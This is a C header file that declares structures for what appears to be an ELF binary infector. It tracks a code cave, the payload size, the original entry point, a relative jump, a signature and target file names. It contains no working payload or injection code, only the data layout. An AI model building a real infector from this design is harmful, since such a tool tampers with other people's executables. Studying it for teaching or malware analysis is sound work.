#ifndef DATA_H
# define DATA_H

# include <elf.h>
# include <sys/types.h>
# include <stdbool.h>
# include <linux/limits.h>

#define SIGNATURE_SIZE 54
#define MAGIC_NUMBER 0x15D2F
#define KEY_SIZE 2048

typedef struct bootstrap_data_s {
	int argc;
	char **argv;
	char **envp;
} bootstrap_data_t;

typedef struct fileview_s {
	uint8_t *data;
	size_t size;
} fileview_t;

typedef struct dirent_s {
	__ino_t d_ino;
	__off_t d_off;
	unsigned short d_reclen;
	unsigned char d_type;
	char d_name[256];
} dirent_t;

typedef struct elf_s {
	Elf64_Ehdr	*ehdr;
	Elf64_Shdr	*shdr;
	Elf64_Phdr	*phdr;

	size_t		size;
	mode_t		mode;

} elf_t;

typedef struct cave_s {
	Elf64_Addr	addr;
	Elf64_Addr	offset;
	/* size of the payload */
	size_t		p_size;

	Elf64_Addr	old_entry;
	int32_t		rel_jmp;
} cave_t;

typedef struct data_s {
	uint8_t		*file;
	size_t		size;

	elf_t		elf;
	cave_t		cave;

	char	target_name[PATH_MAX];

	bootstrap_data_t	*bs_data;

} data_t;

typedef struct file_s {
	fileview_t view;
	mode_t mode;
	char abs_path[PATH_MAX];
} file_t;

void	free_data(data_t *data);
int		update_hdr(data_t *data);

#endif
